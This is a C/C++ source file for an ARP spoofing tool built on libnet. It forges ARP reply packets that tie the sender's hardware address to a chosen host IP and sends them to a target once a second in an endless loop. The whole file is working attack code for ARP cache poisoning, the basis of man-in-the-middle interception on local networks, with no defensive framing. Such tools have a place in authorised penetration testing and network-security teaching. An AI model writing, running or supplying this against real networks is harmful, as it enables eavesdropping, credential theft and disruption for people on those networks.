#include "arpspoof.hpp"

void cnvrt_ip2b( char *ip, uint8_t *dst )
{
    register int i, j;
    char frag[4];
    uint8_t dst_ip[4];

    i = 0;
    j = 0;
    
    while ( *ip != '\0' )
    {
        if ( *ip == '.' ) {
            frag[i] = '\0', dst_ip[j++] = atoi( frag ), i = 0, ip++;
        }
        frag[i++] = *ip++;
    }
    
    frag[i] = '\0';
    dst_ip[j] = atoi( frag );
    memcpy( dst, dst_ip, 4 );
}

void arpsf_packet( libnet_t *ltag, struct arpsf_ctx *ctx )
{
    libnet_ptag_t ether, arp;
    uint8_t hw_unkn[6] = { 
        0x00, 0x00, 0x00,
        0x00, 0x00, 0x00 
    };
    
    arp = libnet_autobuild_arp(
        ARPOP_REPLY,
        ctx->src_hw,
        ctx->host,
        hw_unkn,
        ctx->target,
        ltag
    );
    if ( arp < 0 )
        __die( ltag, "Error building arp packet!" );

    ether = libnet_autobuild_ethernet( 
        hw_unkn, 
        ETHERTYPE_ARP, 
        ltag
    );
    if ( ether < 0 )
        __die( ltag, "Error building ethernet header!" );
}

void arpspoof_initiate( libnet_t *ltag, struct arpsf_ctx *ctx )
{
    int lpstat;
    
    for ( ;; ) {
        arpsf_packet( ltag , ctx);
        lpstat = libnet_write( ltag );
        if( lpstat < 0 )
        {
            strcpy( arpsf_errbuf, libnet_geterror( ltag ) );
            __die( ltag , arpsf_errbuf );
        }
        sleep( 1 );
        libnet_clear_packet( ltag );
    }
}

void arpspoof( struct arpsf_ctx *ctx, char *iface )
{
    int lpstat;
    libnet_t *ltag;
    struct libnet_ether_addr *hw;

    if ( !(ltag = libnet_init( 
            LIBNET_LINK, iface, arpsf_errbuf )) 
    ) {
        __die( NULL, arpsf_errbuf );
    }
    
    if ( !(hw = libnet_get_hwaddr( ltag )) ) {
        __die( ltag, libnet_geterror( ltag ) );
    }
    memcpy( ctx->src_hw, hw->ether_addr_octet, 6 );
    arpspoof_initiate( ltag, ctx );
}

void __die( libnet_t *ltag, const char *msg )
{
    std::cerr << msg << std::endl;
    if ( ltag )
        libnet_destroy( ltag );
    exit( 2 );
}